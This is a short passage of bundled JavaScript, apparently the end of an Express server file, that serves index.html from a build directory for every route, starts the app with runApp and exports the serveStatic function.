  app2.use("*", (_req, res) => {
    res.sendFile(path2.resolve(distPath, "index.html"));
  });
}
(async () => {
  await runApp(serveStatic);
})();
export {
  serveStatic
};
